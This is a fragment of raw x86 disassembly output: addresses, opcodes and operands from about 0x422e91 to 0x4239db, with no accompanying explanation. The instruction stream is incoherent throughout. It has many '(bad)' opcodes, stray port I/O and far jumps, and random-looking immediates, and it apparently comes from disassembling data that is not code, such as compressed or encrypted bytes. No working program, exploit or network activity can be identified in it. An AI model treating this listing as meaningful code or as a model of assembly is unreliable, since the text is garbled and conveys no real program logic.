  422e91:	dec    esp
  422e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e93:	pop    ecx
  422e94:	mov    ebp,0xc1e041a7
  422e99:	leave  
  422e9a:	outs   dx,BYTE PTR ds:[esi]
  422e9b:	icebp  
  422e9c:	popa   
  422e9d:	cmp    eax,0x2073c464
  422ea2:	scas   al,BYTE PTR es:[edi]
  422ea3:	or     cl,BYTE PTR [edx-0x2e860b5b]
  422ea9:	jnp    0x422e79
  422eab:	jno    0x422f24
  422ead:	push   eax
  422eae:	and    BYTE PTR [esi+eiz*1-0x38d5d77e],0xac
  422eb6:	aad    0xc2
  422eb8:	pop    edi
  422eb9:	cmc    
  422eba:	mov    edx,0xe132173a
  422ebf:	(bad)  
  422ec0:	or     eax,0x4f0c987f
  422ec5:	bound  ebp,QWORD PTR [eax-0x21]
  422ec8:	mov    dh,0x57
  422eca:	mov    cl,0xa
  422ecc:	inc    ecx
  422ecd:	jmp    0x892962df
  422ed2:	out    0xe9,al
  422ed4:	xor    esi,DWORD PTR [eax-0x764a0d7c]
  422eda:	mov    al,ds:0x230d444e
  422edf:	or     edi,0xffffffa6
  422ee2:	lock push eax
  422ee4:	out    dx,al
  422ee5:	inc    edi
  422ee6:	xor    al,0x55
  422ee8:	or     ah,BYTE PTR [esi+0x77]
  422eeb:	jns    0x422ed4
  422eed:	push   0x0
	...
  422f56:	adc    DWORD PTR [ebp-0x78],0x19
  422f5a:	(bad)  
  422f5c:	xchg   ebx,eax
  422f5d:	fisttp WORD PTR [eax]
  422f5f:	mov    eax,0x90bcca33
  422f64:	add    eax,0x177677a
  422f69:	add    BYTE PTR [eax],al
  422f6b:	add    DWORD PTR [eax],eax
  422f6d:	add    dl,ah
  422f6f:	iret   
  422f70:	sbb    al,0xa7
  422f72:	push   DWORD PTR [ebx]
  422f74:	jo     0x422f67
  422f76:	mov    eax,0xd34878f5
  422f7b:	in     eax,dx
  422f7c:	jecxz  0x422fb6
  422f7e:	arpl   WORD PTR [edi-0x10],cx
  422f81:	outs   dx,BYTE PTR ds:[esi]
  422f82:	sbb    DWORD PTR [esi-0x42e22e7f],esi
  422f88:	outs   dx,DWORD PTR ds:[esi]
  422f89:	imul   DWORD PTR [esi]
  422f8b:	scas   al,BYTE PTR es:[edi]
  422f8c:	test   DWORD PTR [eax+0x56d8143c],0xbe4310bd
  422f96:	add    DWORD PTR [ebp-0x3982703d],ecx
  422f9c:	xor    bh,bh
  422f9e:	cmp    DWORD PTR [ecx],eax
  422fa0:	cs mov ebx,0x4511121d
  422fa6:	jmp    0xf5bd:0x2350a86
  422fad:	add    DWORD PTR [ebp-0x1e8f4ee5],esp
  422fb3:	sbb    ecx,DWORD PTR [ebp+0x67b43885]
  422fb9:	lods   eax,DWORD PTR ds:[esi]
  422fba:	leave  
  422fbb:	mov    al,ds:0x51fc2adc
  422fc0:	pop    ecx
  422fc1:	adc    al,0x54
  422fc3:	sub    DWORD PTR [edi-0x48],ecx
  422fc6:	add    al,0x4a
  422fc8:	loopne 0x423037
  422fca:	add    al,BYTE PTR [edi-0x52]
  422fcd:	jp     0x422ff6
  422fcf:	clc    
  422fd0:	outs   dx,BYTE PTR ds:[esi]
  422fd1:	jp     0x422ff0
  422fd3:	xor    DWORD PTR [esi-0x79],edx
  422fd6:	add    BYTE PTR [edx+0x4c],bh
  422fd9:	gs jl  0x422f67
  422fdc:	mov    ebp,0x43599bf4
  422fe1:	adc    eax,edi
  422fe3:	mov    edi,0x81ddebc2
  422fe8:	lea    edi,[ebx+0x422f0001]
  422fee:	outs   dx,BYTE PTR ds:[esi]
  422fef:	pop    ecx
  422ff0:	shl    ecx,1
  422ff2:	lods   eax,DWORD PTR ds:[esi]
  422ff3:	cwde   
  422ff4:	cwde   
  422ff5:	dec    esp
  422ff6:	and    edx,edx
  422ff8:	fadd   QWORD PTR [eax-0x782624b3]
  422ffe:	or     al,0x50
  423000:	imul   eax,esp,0x7ff852a0
  423006:	inc    edi
  423007:	jg     0x422fd9
  423009:	mov    ebp,DWORD PTR [ebp+ebx*8-0x59]
  42300d:	and    al,0x35
  42300f:	xchg   ebx,eax
  423010:	ja     0x423033
  423012:	sub    ecx,DWORD PTR [esi+ecx*8+0x23]
  423016:	mov    ecx,0x86535757
  42301b:	(bad)  
  42301c:	inc    ebx
  42301e:	dec    esi
  42301f:	popa   
  423020:	add    eax,0x76222ab5
  423025:	fst    DWORD PTR [esi+0x20]
  423028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423029:	sbb    eax,0x95262041
  42302e:	sbb    DWORD PTR [edi],ebx
  423030:	inc    ebp
  423031:	shr    DWORD PTR [eax+esi*2+0x5d5782],0x51
  423039:	in     al,dx
  42303a:	stc    
  42303b:	pop    ds
  42303c:	inc    esi
  42303d:	mov    al,0xa
  42303f:	add    DWORD PTR [ebp+0xf],0x27
  423043:	cmp    edi,DWORD PTR [eax]
  423045:	add    esp,esp
  423047:	xlat   BYTE PTR ds:[ebx]
  423048:	sahf   
  423049:	(bad)  
  42304a:	mov    edi,0x2f875eb0
  42304f:	sti    
  423050:	ss jne 0x42304a
  423053:	mov    ds:0xc9b94437,eax
  423058:	iret   
  423059:	jnp    0x422feb
  42305b:	cld    
  42305c:	sbb    dl,al
  42305e:	push   edx
  42305f:	mov    esp,0xcbc066ec
  423064:	pushf  
  423065:	jo     0x4230c0
  423067:	fstp   TBYTE PTR [edx+0x29686561]
  42306d:	adc    eax,0x0
	...
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [ebp+eax*4+0x676a28a2],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR [esi],al
  4230ef:	pop    DWORD PTR [edi+edx*4]
  4230f2:	outs   dx,DWORD PTR ds:[esi]
  4230f3:	aad    0x89
  4230f5:	mov    WORD PTR [esi-0x32],ss
  4230f8:	out    dx,eax
  4230f9:	mov    esi,0xda0d5fc1
  4230fe:	popa   
  4230ff:	mov    bl,0xe0
  423101:	mov    ebx,0xf36a9c3f
  423106:	pop    ss
  423107:	fwait
  423108:	add    eax,0x6244aa1b
  42310d:	push   0x7aff8cfe
  423112:	pop    esp
  423113:	cli    
  423114:	xor    edx,DWORD PTR [ecx+0x62f759b6]
  42311a:	adc    al,0x1d
  42311c:	cdq    
  42311d:	dec    ebp
  42311e:	hlt    
  42311f:	adc    ch,dl
  423121:	cmp    eax,0xa937aedb
  423126:	test   BYTE PTR [ebx+0x30c7f8bc],dh
  42312c:	push   esp
  42312d:	inc    ebp
  42312e:	or     eax,0xf26524f
  423133:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423134:	add    DWORD PTR [ebx+0x44],0xffffffc7
  423138:	or     BYTE PTR [eax+0x6bd98dae],bh
  42313e:	popf   
  42313f:	xchg   BYTE PTR [edi],al
  423141:	into   
  423142:	add    al,0x50
  423144:	inc    ebx
  423145:	fbstp  TBYTE PTR [edx-0x164e2fd4]
  42314b:	xor    DWORD PTR [ebx+0x1a18ed21],eax
  423151:	dec    ebx
  423152:	push   ss
  423153:	xlat   BYTE PTR ds:[ebx]
  423154:	xor    al,0xef
  423156:	std    
  423157:	jmp    0x4c65:0xce263b8e
  42315e:	cmp    dh,BYTE PTR [edi-0x7f]
  423161:	inc    ebp
  423163:	rcr    BYTE PTR [ebp-0x26],1
  423166:	ja     0x4231ca
  423168:	(bad)  
  423169:	and    DWORD PTR [eax+0x23395d40],edi
  42316f:	adc    al,BYTE PTR [edx-0x9453d8f]
  423175:	and    ecx,DWORD PTR [esi+0x2f569132]
  42317b:	mov    eax,ds:0x148a3912
  423180:	out    0x98,al
  423182:	mov    ebp,0x26772e84
  423187:	out    dx,al
  423188:	mov    eax,ds:0x3959a743
  42318d:	into   
  42318e:	outs   dx,BYTE PTR ds:[esi]
  42318f:	dec    ebp
  423190:	rcl    dh,0xa8
  423193:	daa    
  423194:	inc    ebp
  423195:	call   0x7a0d:0x34fba52b
  42319c:	jne    0x423137
  42319e:	rcr    BYTE PTR [ebx],0xb5
  4231a1:	add    esi,esi
  4231a3:	dec    esi
  4231a4:	not    DWORD PTR [ecx-0x419f674f]
  4231aa:	pop    ebp
  4231ab:	jl     0x42315b
  4231ad:	push   ds
  4231ae:	rcr    BYTE PTR [ebp+0x3c],cl
  4231b1:	cdq    
  4231b2:	fistp  DWORD PTR [edi+eiz*8-0x69]
  4231b6:	mov    ebp,0x16d06f15
  4231bb:	stos   BYTE PTR es:[edi],al
  4231bc:	(bad)  
  4231bd:	fsubr  DWORD PTR [ebp+0x42c4c659]
  4231c3:	cmp    cl,ah
  4231c5:	pop    ebp
  4231c6:	lods   al,BYTE PTR ds:[esi]
  4231c7:	jmp    0x423187
  4231c9:	fisubr DWORD PTR [ecx]
  4231cb:	daa    
  4231cc:	imul   ecx,eax,0x2c
  4231cf:	fiadd  WORD PTR [ecx+0x4d6ae283]
  4231d5:	bound  ebp,QWORD PTR [eax-0x2c]
  4231d8:	jmp    0x42321f
  4231da:	and    al,0xf7
  4231dc:	je     0x42318c
  4231de:	jns    0x423239
  4231e0:	call   0x6f43:0xe45dee8f
  4231e7:	xor    al,0xf8
  4231e9:	iret   
  4231ea:	cs leave 
  4231ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231ed:	pop    ecx
	...
  423256:	jns    0x423249
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx-0x1587740c],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    BYTE PTR [ebx+0x29073e03],dh
  423273:	je     0x423260
  423275:	data16 cli 
  423277:	ficomp DWORD PTR ds:[ebx]
  42327a:	jle    0x423210
  42327c:	push   ecx
  42327d:	pusha  
  42327e:	inc    edx
  42327f:	pop    ds
  423280:	cdq    
  423281:	pop    eax
  423282:	mov    edi,0xf9a164b7
  423287:	out    0x57,al
  423289:	xchg   DWORD PTR [eax-0x40cdef34],esp
  42328f:	int3   
  423290:	aaa    
  423291:	pop    es
  423292:	mov    dl,0x7b
  423294:	mov    dl,0xe5
  423296:	(bad)  
  423298:	push   ds
  423299:	(bad)  
  42329a:	test   eax,0x75943d4a
  42329f:	iret   
  4232a0:	(bad)  
  4232a2:	loope  0x42324b
  4232a4:	adc    eax,0xe105d0a5
  4232a9:	test   DWORD PTR [ecx-0x65505858],ebx
  4232af:	loopne 0x42326d
  4232b1:	or     ebp,ebp
  4232b3:	pop    esp
  4232b4:	xor    DWORD PTR [ebx+0x7d],0x4c
  4232b8:	pop    ds
  4232b9:	jb     0x4232ca
  4232bb:	js     0x423326
  4232bd:	dec    ebp
  4232be:	out    0xa8,al
  4232c0:	ins    DWORD PTR es:[edi],dx
  4232c1:	je     0x4232d3
  4232c3:	sub    al,0x1d
  4232c5:	pop    esp
  4232c6:	jg     0x42328a
  4232c8:	mov    ebx,0x51f45031
  4232cd:	mov    dh,0xf0
  4232cf:	ja     0x4232fc
  4232d1:	pushf  
  4232d2:	mov    cl,0x3b
  4232d4:	push   esp
  4232d5:	jbe    0x4232ce
  4232d7:	jo     0x42328c
  4232d9:	pop    edi
  4232da:	pop    es
  4232db:	sti    
  4232dc:	pop    edi
  4232dd:	jbe    0x4232bd
  4232df:	mov    ebx,ebp
  4232e1:	sbb    eax,0xde34dcdc
  4232e6:	retf   0x6c71
  4232e9:	mov    bh,0xd0
  4232eb:	int3   
  4232ec:	shl    DWORD PTR [ecx-0x76],cl
  4232ef:	icebp  
  4232f0:	mov    ss,ebp
  4232f2:	mov    ds:0xb01590e5,al
  4232f7:	push   esi
  4232f8:	mov    eax,ds:0xb56d582d
  4232fd:	fdiv   DWORD PTR [esi]
  4232ff:	mov    ecx,0x1797e059
  423304:	(bad)  
  423306:	sbb    al,0xb9
  423308:	je     0x423304
  42330a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42330b:	inc    ecx
  42330c:	shr    BYTE PTR [edx-0xebc60b3],cl
  423312:	aam    0x45
  423314:	repnz (bad) 
  423316:	jmp    0x42337f
  423318:	sbb    ebx,edx
  42331a:	test   eax,0x9e847017
  42331f:	mov    ds:0x201527d8,eax
  423324:	and    eax,0xfcab081f
  423329:	pushf  
  42332a:	sub    BYTE PTR ds:0xe0be2ab5,ah
  423330:	fsub   QWORD PTR [edi-0x77]
  423333:	mov    ebp,0x684f7b22
  423338:	xor    eax,0xccc1563e
  42333d:	popa   
  42333e:	mov    ebp,0xf69481e5
  423343:	dec    esp
  423344:	imul   edi,DWORD PTR [esi-0x78],0x68
  423348:	mov    ecx,0x4e78534
  42334d:	loopne 0x423394
  42334f:	xchg   edi,eax
  423350:	inc    esi
  423351:	mov    edi,0x5c80f0b4
  423356:	sbb    BYTE PTR [ebx+0xa],bh
  423359:	fidiv  WORD PTR [ebx]
  42335b:	lds    ecx,FWORD PTR [ebx+0x71a4eadd]
  423361:	sbb    eax,0x5027f515
  423366:	call   0xe6413283
  42336b:	sbb    BYTE PTR [esi],ch
  42336d:	sub    eax,DWORD PTR [eax]
	...
  4233d3:	add    BYTE PTR [eax],al
  4233d5:	add    al,bh
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0xa5750f44
  4233e4:	arpl   dx,cx
  4233e6:	addr16 jp 0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    ah,dl
  4233ef:	pop    ss
  4233f0:	inc    edi
  4233f1:	enter  0x502d,0x27
  4233f5:	mov    ah,0x23
  4233f7:	aaa    
  4233f8:	fisttp WORD PTR [eax]
  4233fa:	add    bl,cl
  4233fc:	sahf   
  4233fd:	xor    bh,dl
  4233ff:	pop    esp
  423400:	xchg   esi,eax
  423401:	das    
  423402:	outs   dx,DWORD PTR ds:[esi]
  423403:	outs   dx,DWORD PTR ds:[esi]
  423404:	or     eax,0x649eb66d
  423409:	cmp    DWORD PTR [ecx+0x41],esp
  42340c:	and    DWORD PTR [edx],0x56
  42340f:	aaa    
  423410:	mov    edx,0xa43799c4
  423415:	into   
  423416:	cmc    
  423417:	dec    ecx
  423418:	sbb    eax,0xa458a91c
  42341d:	cmp    ah,0x5
  423420:	dec    edi
  423421:	and    cl,al
  423423:	gs mov dl,0x22
  423426:	movq   mm7,mm2
  423429:	call   0xbbc3:0x117e2e00
  423430:	cmp    ecx,ebx
  423432:	xchg   esi,eax
  423433:	xor    eax,DWORD PTR [ebx+eiz*1-0x6a6dfe8e]
  42343a:	scas   eax,DWORD PTR es:[edi]
  42343b:	loop   0x42348b
  42343d:	xchg   esp,eax
  42343e:	pop    ebp
  42343f:	ja     0x4233e0
  423441:	call   0xbcb4135b
  423446:	leave  
  423447:	cmp    al,0x9a
  423449:	rcl    DWORD PTR [ebp-0x22cdfcbb],1
  42344f:	gs fwait
  423451:	and    esi,esi
  423453:	in     eax,0x69
  423455:	mov    BYTE PTR [ecx],dh
  423457:	retf   
  423458:	push   edi
  423459:	fdiv   QWORD PTR [esi]
  42345b:	imul   ch
  42345d:	shl    BYTE PTR ds:0x9ac3257e,cl
  423463:	cmc    
  423464:	retf   
  423465:	les    ecx,FWORD PTR [eax]
  423467:	add    al,ch
  423469:	shl    DWORD PTR [esi],cl
  42346b:	add    eax,0x47c2ee8c
  423470:	push   edi
  423471:	inc    ecx
  423472:	iret   
  423473:	adc    al,0x19
  423475:	hlt    
  423476:	fisttp QWORD PTR [esi+0x449b3d90]
  42347c:	cmp    bh,BYTE PTR ds:0x417e63c8
  423482:	dec    ebx
  423483:	rcr    DWORD PTR [ecx+0x3e],0xaf
  423487:	(bad)
  42348b:	jns    0x42347d
  42348d:	es mov ch,0xea
  423490:	sti    
  423491:	and    eax,0x23496747
  423496:	retf   0x573
  423499:	xor    eax,0x5e1cfe89
  42349e:	ret    
  42349f:	or     BYTE PTR [esi],0xf0
  4234a2:	push   ebp
  4234a3:	je     0x423523
  4234a5:	mov    DWORD PTR [esp+edx*4],ecx
  4234a8:	outs   dx,BYTE PTR ss:[esi]
  4234aa:	push   edx
  4234ab:	mov    ebp,0xc510421e
  4234b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234b1:	mov    ebx,edi
  4234b3:	popf   
  4234b4:	pop    ebp
  4234b5:	pop    ecx
  4234b6:	popa   
  4234b7:	repz or BYTE PTR [esi-0xc],ch
  4234bb:	mov    bh,0xf3
  4234bd:	fldenv [eax+0x329b575d]
  4234c3:	fimul  WORD PTR [edx]
  4234c5:	sbb    esi,ecx
  4234c7:	add    ebp,esp
  4234c9:	cmc    
  4234ca:	test   al,0x4e
  4234cc:	std    
  4234cd:	retf   
  4234ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234cf:	xchg   DWORD PTR [esp+eax*8-0x7f7e3c82],ebx
  4234d6:	sub    eax,ecx
  4234d8:	test   al,ah
  4234da:	lods   al,BYTE PTR ds:[esi]
  4234db:	push   ds
  4234dc:	fwait
  4234dd:	retf   
  4234de:	pop    ds
  4234df:	dec    esi
  4234e0:	data16 xor cl,cl
  4234e3:	mov    ebp,0xe612e829
  4234e8:	sub    eax,0x967ae1c6
  4234ed:	adc    eax,DWORD PTR [eax]
	...
  423553:	add    BYTE PTR [eax],al
  423555:	add    al,al
  423557:	mov    al,0x45
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	jne    0x42355b
  42355c:	jmp    0xf21f:0xadf467bf
  423563:	cmp    DWORD PTR [edx-0x31],esi
  423566:	addr16 jnp 0x42356a
  423569:	add    BYTE PTR [eax],al
  42356b:	add    DWORD PTR [eax],eax
  42356d:	add    ah,dl
  42356f:	mov    al,0xd8
  423571:	xchg   edi,eax
  423572:	push   edi
  423573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423574:	pop    esi
  423575:	(bad)  
  423576:	mov    eax,0x2b704261
  42357b:	adc    BYTE PTR [edx+0x2c0ad5a9],ch
  423581:	mov    edi,0x767bdff2
  423586:	ja     0x4235c9
  423588:	mov    DWORD PTR [eiz*1+0x654b734d],esp
  42358f:	mov    al,0xea
  423591:	rcl    ch,0x4b
  423594:	mov    ecx,0xf08592b2
  423599:	fwait
  42359a:	xchg   ebx,eax
  42359b:	mov    ecx,0x8fa6af17
  4235a0:	add    ch,dl
  4235a2:	shl    ebx,1
  4235a4:	fnstenv [ecx]
  4235a6:	popa   
  4235a7:	aas    
  4235a8:	ret    
  4235a9:	sbb    BYTE PTR [ecx+0x25],bl
  4235ac:	lea    edx,[edx]
  4235ae:	jl     0x423601
  4235b0:	and    edi,DWORD PTR [edi]
  4235b2:	push   cs
  4235b3:	sub    edi,ecx
  4235b5:	sbb    BYTE PTR [eax],0xc0
  4235b8:	lock aam 0xba
  4235bb:	test   eax,0xc748cf39
  4235c0:	inc    ebp
  4235c2:	fs mov edi,0x22a0b1d
  4235c8:	or     esp,eax
  4235ca:	(bad)  
  4235cc:	mov    eax,0xc25a9b83
  4235d1:	mov    ecx,0x51d2bff2
  4235d6:	sbb    BYTE PTR [eax+0x45],dl
  4235d9:	ds jg  0x42364f
  4235dc:	inc    DWORD PTR [edi+0x52de3a12]
  4235e2:	xchg   DWORD PTR [ebx-0x41],ecx
  4235e5:	pop    esp
  4235e6:	outs   dx,BYTE PTR ds:[esi]
  4235e7:	(bad)  
  4235e8:	jmp    0x4235d0
  4235ea:	test   DWORD PTR [edx-0x5f],eax
  4235ed:	ret    
  4235ee:	stos   BYTE PTR es:[edi],al
  4235ef:	aas    
  4235f0:	mov    bh,0xdc
  4235f2:	xchg   esi,eax
  4235f3:	or     DWORD PTR [esi],esi
  4235f5:	jg     0x4235ee
  4235f7:	adc    dh,dl
  4235f9:	cmp    ah,BYTE PTR [ebp+eiz*2+0x5d5897f1]
  423600:	das    
  423601:	xchg   edi,eax
  423602:	or     eax,0x8e233376
  423607:	popa   
  423608:	ds jns 0x42360b
  42360b:	cmc    
  42360c:	dec    esp
  42360d:	xor    BYTE PTR [ebp+0x4b],ch
  423610:	pop    ds
  423611:	dec    ecx
  423612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423613:	adc    eax,0xed4352e
  423618:	adc    al,0x50
  42361a:	inc    esi
  42361b:	shl    ebp,cl
  42361d:	mov    ebx,0x71370dde
  423622:	cmp    eax,0xba62d551
  423627:	ficom  DWORD PTR [edi-0x73]
  42362a:	push   edi
  42362b:	jae    0x423643
  42362d:	out    dx,eax
  42362e:	into   
  42362f:	pop    esp
  423630:	pop    eax
  423631:	clc    
  423632:	cwde   
  423633:	ficomp WORD PTR [edi]
  423635:	xor    BYTE PTR [ebp-0x56375488],0xfc
  42363c:	cmp    DWORD PTR ds:0x8d1c4147,0x2f
  423643:	lock call 0x3bde:0x87c47712
  42364b:	mov    ds:0xff2b40e2,al
  423650:	out    dx,al
  423651:	jb     0x423693
  423653:	push   0x69
  423655:	mov    WORD PTR [eax+eax*1-0x4],es
  423659:	pop    esi
  42365a:	cld    
  42365b:	clc    
  42365c:	rcr    BYTE PTR [edx-0x9f7eed9],0xa4
  423663:	pop    ds
  423664:	test   eax,0xba5d764f
  423669:	fiadd  WORD PTR [edi+0xf9150e]
	...
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x2164913
  4236e5:	sbb    al,0x67
  4236e7:	jl     0x4236ea
  4236e9:	add    BYTE PTR [eax],al
  4236eb:	add    DWORD PTR [eax],eax
  4236ed:	add    BYTE PTR [edx+0xbf81373],ch
  4236f3:	and    al,0x75
  4236f5:	jo     0x4236a8
  4236f7:	pop    edx
  4236f8:	das    
  4236f9:	sub    eax,0xa10ddad8
  4236fe:	mov    ch,0xae
  423700:	cmc    
  423701:	mov    ch,0x9f
  423703:	push   0x2a
  423705:	repz in eax,dx
  423707:	mov    eax,ds:0x96541828
  42370c:	sbb    BYTE PTR [ebx+0x4f50e7e7],bh
  423712:	test   BYTE PTR [esi-0x2ec48ca9],bh
  423718:	loopne 0x42377c
  42371a:	fld    DWORD PTR [ebx-0x4f]
  42371d:	mov    esp,0x54823314
  423722:	xor    BYTE PTR [eax-0x7d759ce1],cl
  423728:	in     eax,dx
  423729:	or     eax,0x6def4a32
  42372e:	lds    edx,FWORD PTR [ebx+ebx*4-0x72]
  423732:	ficomp WORD PTR [ecx]
  423734:	test   BYTE PTR [eax+eiz*2],ah
  423737:	loopne 0x4236c1
  423739:	sti    
  42373a:	mov    eax,ds:0x21479028
  42373f:	jecxz  0x423762
  423741:	sub    DWORD PTR [ebx+0x407bfd0d],edx
  423747:	mov    gs,ebp
  423749:	scas   al,BYTE PTR es:[edi]
  42374a:	xchg   ebx,eax
  42374b:	mov    dl,0x77
  42374d:	sbb    edx,esi
  42374f:	add    DWORD PTR [edi+0x2f7e8c71],0x7f
  423756:	dec    ebp
  423757:	mov    dl,0x72
  423759:	loop   0x42374f
  42375b:	out    dx,al
  42375c:	ds std 
  42375e:	mov    edx,eax
  423760:	and    DWORD PTR [edi+0x326ff379],eax
  423766:	mov    dh,0x11
  423768:	xor    eax,DWORD PTR ds:0xf5f3c149
  42376e:	pop    edi
  42376f:	outs   dx,DWORD PTR ds:[esi]
  423770:	jmp    0x6d30:0xe04ba8e6
  423777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423778:	xor    ch,BYTE PTR ds:0x232a0263
  42377e:	ret    0xfd91
  423781:	mov    DWORD PTR [ebx],edi
  423783:	(bad)  
  423784:	sub    BYTE PTR [edi+0x32],cl
  423787:	xor    al,0xa5
  423789:	or     ch,ch
  42378b:	imul   ecx,DWORD PTR [ecx-0x75bc9c86],0xffffffd4
  423792:	add    ebp,DWORD PTR [edi-0x68]
  423795:	or     cl,BYTE PTR [eax]
  423797:	ficom  DWORD PTR [ebx]
  423799:	sbb    ch,BYTE PTR [edx+0x46]
  42379c:	sbb    dl,cl
  42379e:	mov    DWORD PTR [ecx-0x7],edi
  4237a1:	mov    cl,0xc7
  4237a3:	popa   
  4237a4:	(bad)  
  4237a5:	sbb    BYTE PTR [ecx-0x16],ch
  4237a8:	(bad)
  4237ac:	es push esi
  4237ae:	jne    0x42376d
  4237b0:	sti    
  4237b1:	xor    BYTE PTR [ecx],0xd7
  4237b4:	xlat   BYTE PTR ds:[ebx]
  4237b5:	inc    ecx
  4237b6:	js     0x42380e
  4237b8:	push   cs
  4237b9:	aas    
  4237ba:	pushf  
  4237bb:	inc    DWORD PTR [esi+0x248527f4]
  4237c1:	mov    al,ds:0x2bf2b823
  4237c6:	jae    0x42380c
  4237c8:	mov    bh,0xa
  4237ca:	lods   eax,DWORD PTR ds:[esi]
  4237cb:	jmp    0x34a1:0xd0fb21f2
  4237d2:	push   edx
  4237d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237d4:	cs leave 
  4237d6:	lods   eax,DWORD PTR ds:[esi]
  4237d7:	jp     0x423803
  4237d9:	push   esi
  4237da:	cmp    BYTE PTR [esi-0x27],al
  4237dd:	push   cs
  4237de:	jmp    0x8fad:0xa05202c1
  4237e5:	retf   0x7a02
  4237e8:	adc    cl,BYTE PTR [ecx-0x1a97cbc5]
	...
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0xd634e499
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	fsub   DWORD PTR [edi-0x6857770]
  423874:	out    dx,al
  423875:	fistp  QWORD PTR [ecx-0x59021e]
  42387b:	sub    eax,0xa6988d41
  423880:	jno    0x423839
  423882:	push   es
  423883:	stc    
  423884:	add    BYTE PTR [esi],ah
  423886:	rcl    DWORD PTR [ecx],cl
  423888:	mov    eax,DWORD PTR [edi]
  42388a:	mov    esp,0x20a7c8e9
  42388f:	pop    edi
  423891:	jmp    0x369c:0x78421f2
  423898:	hlt    
  423899:	dec    ebp
  42389a:	cmp    bh,ch
  42389c:	pusha  
  42389d:	pop    esp
  42389e:	call   0x945:0x727c53cb
  4238a5:	sub    esi,esp
  4238a7:	adc    eax,0x6a0c644c
  4238ac:	add    al,0x59
  4238ae:	or     eax,0xa93944fc
  4238b3:	es mov bh,0x13
  4238b6:	dec    ebx
  4238b7:	mov    dl,0x48
  4238b9:	aam    0x83
  4238bb:	leave  
  4238bc:	pop    esi
  4238bd:	and    ah,BYTE PTR [edi-0x33]
  4238c0:	cld    
  4238c1:	xchg   edx,eax
  4238c2:	es mov ebp,0xb72e9515
  4238c8:	xchg   edx,eax
  4238c9:	ds push ebp
  4238cb:	repz or al,0x11
  4238ce:	or     eax,0x5d7dabca
  4238d3:	mov    dl,BYTE PTR [ecx+esi*2+0x31087d37]
  4238da:	nop
  4238db:	outs   dx,DWORD PTR ds:[esi]
  4238dc:	test   BYTE PTR [ecx],cl
  4238de:	xchg   esi,eax
  4238df:	fisubr WORD PTR [eax+0x25452345]
  4238e5:	dec    BYTE PTR [esi]
  4238e7:	retf   
  4238e8:	push   ds
  4238e9:	inc    esp
  4238ea:	adc    bh,BYTE PTR [ebp-0x36]
  4238ed:	inc    ebp
  4238ee:	cmp    bl,dh
  4238f0:	fbld   TBYTE PTR [eax]
  4238f2:	sub    BYTE PTR [ebp+ebp*4+0x47],dl
  4238f6:	sub    BYTE PTR [edx+eiz*1+0x7d],ch
  4238fa:	sti    
  4238fb:	sbb    al,0x9c
  4238fd:	inc    esp
  4238fe:	arpl   dx,bp
  423900:	ds add al,0x7a
  423903:	xor    al,0x18
  423905:	or     dl,dh
  423907:	popa   
  423908:	scas   al,BYTE PTR es:[edi]
  423909:	sbb    al,0x2b
  42390b:	hlt    
  42390c:	(bad)  
  42390d:	rcl    DWORD PTR [ebp-0x2c12aa87],cl
  423913:	lahf   
  423914:	pusha  
  423915:	aas    
  423916:	jo     0x4238b2
  423918:	jmp    0x42bd:0x168e1c5c
  42391f:	dec    ecx
  423920:	add    DWORD PTR [edx-0x2a],eax
  423923:	inc    ecx
  423924:	stos   DWORD PTR es:[edi],eax
  423925:	dec    ebx
  423926:	enter  0x82f8,0xb7
  42392a:	aam    0x2c
  42392c:	out    0x9,eax
  42392e:	sub    DWORD PTR [esi-0x1],0x34
  423932:	int    0x29
  423934:	pop    esp
  423935:	pop    edi
  423936:	in     al,0x14
  423938:	call   0x4201:0xc2f29b68
  42393f:	adc    bl,bh
  423941:	add    BYTE PTR [edi+0x1b56db93],ah
  423947:	jbe    0x4238dd
  423949:	or     ebp,DWORD PTR [esi+0x3e]
  42394c:	ret    
  42394d:	int3   
  42394e:	test   BYTE PTR [eax-0x48],bl
  423951:	bound  eax,QWORD PTR [eax+0x329379f7]
  423957:	dec    edx
  423958:	xor    BYTE PTR [esi+eiz*4+0x146db45a],dl
  42395f:	jmp    0xa6d0:0x37abfef9
  423966:	xor    ecx,DWORD PTR [ebx]
  423968:	out    dx,eax
  423969:	dec    ecx
  42396a:	dec    ecx
  42396b:	jb     0x423944
  42396d:	fld    DWORD PTR [eax]
	...
  4239d3:	add    BYTE PTR [eax],al
  4239d5:	add    BYTE PTR [edx-0x770e5c],cl
  4239db:	(bad)  
